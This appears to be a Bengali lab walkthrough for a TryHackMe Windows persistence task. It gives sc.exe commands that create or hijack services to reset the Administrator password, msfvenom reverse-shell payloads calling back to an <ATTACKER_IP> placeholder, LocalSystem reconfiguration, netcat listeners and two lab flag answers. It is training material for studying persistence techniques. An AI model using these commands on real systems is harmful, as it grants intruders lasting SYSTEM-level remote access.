# ⚙️ টাস্ক ৪: সার্ভিসের অপব্যবহার (Abusing Services)

**ধারণা:** উইন্ডোজ সার্ভিস এমন একটি প্রোগ্রাম যা ব্যাকগ্রাউন্ডে চলে এবং সিস্টেম চালু হওয়ার সাথে সাথে অটোমেটিক চালু হতে পারে। হ্যাকাররা নতুন সার্ভিস তৈরি করে অথবা পুরোনো অচল সার্ভিস হাইজ্যাক করে পার্সিস্টেন্স (স্থায়ী প্রবেশাধিকার) তৈরি করে।

এই টাস্কে দুইটি পদ্ধতি আলোচনা করা হয়েছে:
1.  নতুন ব্যাকডোর সার্ভিস তৈরি (Creating backdoor services)
2.  বিদ্যমান সার্ভিস পরিবর্তন (Modifying existing services)

---

## 🔧 পার্ট ১: নতুন ব্যাকডোর সার্ভিস তৈরি (Creating Backdoor Services)

**কৌশল:** `sc.exe` টুল ব্যবহার করে একটি নতুন সার্ভিস তৈরি করা যা সিস্টেম চালু হলেই অটোমেটিক আমাদের পেলোড চালাবে।

### ধাপে ধাপে নির্দেশনা

| ধাপ | কমান্ড / কাজ | ব্যাখ্যা |
|:---:|:---|:---|
| ১ | **পাসওয়ার্ড রিসেট সার্ভিস তৈরি:** | |
| | `sc.exe create THMservice binPath= "net user Administrator Passwd123" start= auto` | **লক্ষণীয়:** `=` চিহ্নের পরে একটি স্পেস (Space) দিতে হবে। এই সার্ভিস চালু হলে অ্যাডমিনের পাসওয়ার্ড `Passwd123` হয়ে যাবে। |
| | `sc.exe start THMservice` | সার্ভিসটি তাৎক্ষণিক চালু করার জন্য। |
| ২ | **রিভার্স শেল পেলোড তৈরি (অ্যাটাকার মেশিনে):** | |
| | `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=4448 -f exe-service -o rev-svc.exe` | `exe-service` ফরম্যাটটি জরুরি, কারণ সার্ভিসের জন্য বিশেষ ধরনের এক্সিকিউটেবল প্রয়োজন যা সিস্টেমের সাথে সঠিকভাবে ইন্টারঅ্যাক্ট করতে পারে। |
| ৩ | **পেলোড ট্রান্সফার:** | |
| | `rev-svc.exe` ফাইলটি টার্গেট মেশিনে `C:\Windows` ফোল্ডারে আপলোড করো। | `C:\Windows` ফোল্ডার সাধারণত সবার অ্যাক্সেসযোগ্য এবং কম সন্দেহজনক। |
| ৪ | **নতুন সার্ভিস তৈরি ও চালু:** | |
| | `sc.exe create THMservice2 binPath= "C:\Windows\rev-svc.exe" start= auto` | সার্ভিস তৈরি করা হলো। `start= auto` মানে সিস্টেম রিবুট হলে স্বয়ংক্রিয়ভাবে চালু হবে। |
| | `sc.exe start THMservice2` | সার্ভিসটি তাৎক্ষণিক চালু করা হলো। |
| ৫ | **লিসেনার চালু (অ্যাটাকার মেশিনে):** | |
| | `nc -lvp 4448` অথবা মেটাসপ্লয়েট মাল্টি/হ্যান্ডলার ব্যবহার করো। | পোর্ট ৪৪৪৮-এ রিভার্স শেল আসবে। |
| ৬ | **ফ্ল্যাগ সংগ্রহ:** | |
| | `C:\flags\flag7.exe` রান করো। | **ফ্ল্যাগ ৭:** `THM{SUSPICIOUS_SERVICES}` |

## 🛠️ পার্ট ২: বিদ্যমান সার্ভিস পরিবর্তন (Modifying Existing Services)

**কৌশল:** নতুন সার্ভিস তৈরি করলে ব্লু টিমের নজরে আসার সম্ভাবনা থাকে। তাই বর্তমানে বন্ধ থাকা বা অব্যবহৃত কোনো সার্ভিস খুঁজে বের করে তার কনফিগারেশন পরিবর্তন করে নিজের পেলোড বসানো হয়।

### ধাপে ধাপে নির্দেশনা

| ধাপ | কমান্ড / কাজ | ব্যাখ্যা |
|:---:|:---|:---|
| ১ | **সব সার্ভিসের লিস্ট দেখা:** | |
| | `sc.exe query state= all` | এই কমান্ডটি সিস্টেমের সব সার্ভিসের তালিকা দেখাবে। আমরা একটি বন্ধ (STOPPED) সার্ভিস খুঁজছি। |
| | **উদাহরণ আউটপুট:** | |
| | `SERVICE_NAME: THMService3` | |
| | `STATE: 1 STOPPED` | |
| ২ | **নির্দিষ্ট সার্ভিসের কনফিগারেশন চেক:** | |
| | `sc.exe qc THMService3` | এই কমান্ডটি সার্ভিসের বিস্তারিত কনফিগারেশন দেখাবে। |
| | **গুরুত্বপূর্ণ ফিল্ডসমূহ:** | |
| | `BINARY_PATH_NAME: C:\MyService\THMService.exe` | সার্ভিস যে এক্সিকিউটেবল চালায় তার পাথ। |
| | `START_TYPE: 2 AUTO_START` | সার্ভিসটি অটোমেটিক চালু হয় কিনা। |
| | `SERVICE_START_NAME: NT AUTHORITY\Local Service` | সার্ভিসটি কোন অ্যাকাউন্টের অধীনে চলে। |
| ৩ | **নতুন রিভার্স শেল পেলোড তৈরি (অ্যাটাকার মেশিনে):** | |
| | `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=5558 -f exe-service -o rev-svc2.exe` | নতুন পোর্ট (৫৫৫৮) ব্যবহার করা হয়েছে যাতে পূর্বের লিসেনারের সাথে কনফ্লিক্ট না হয়। |
| ৪ | **পেলোড ট্রান্সফার:** | |
| | `rev-svc2.exe` টার্গেট মেশিনে `C:\Windows\` ফোল্ডারে আপলোড করো। | |
| ৫ | **সার্ভিস কনফিগারেশন পরিবর্তন:** | |
| | `sc.exe config THMservice3 binPath= "C:\Windows\rev-svc2.exe" start= auto obj= "LocalSystem"` | **binPath:** পেলোডের নতুন পাথ। **start= auto:** রিবুটে অটো চালু। **obj= LocalSystem:** SYSTEM লেভেলের সর্বোচ্চ সুবিধা। |
| ৬ | **পরিবর্তন যাচাই:** | |
| | `sc.exe qc THMservice3` | নিশ্চিত হও যে `BINARY_PATH_NAME`, `START_TYPE`, এবং `SERVICE_START_NAME` সঠিকভাবে পরিবর্তিত হয়েছে। |
| ৭ | **লিসেনার চালু ও সার্ভিস স্টার্ট:** | |
| | অ্যাটাকার মেশিনে `nc -lvp 5558` চালু করো। | |
| | `sc.exe start THMservice3` | টার্গেট মেশিনে সার্ভিসটি চালু করো। |
| ৮ | **ফ্ল্যাগ সংগ্রহ:** | |
| | `C:\flags\flag8.exe` রান করো। | **ফ্ল্যাগ ৮:** `THM{IN_PLAIN_SIGHT}` |
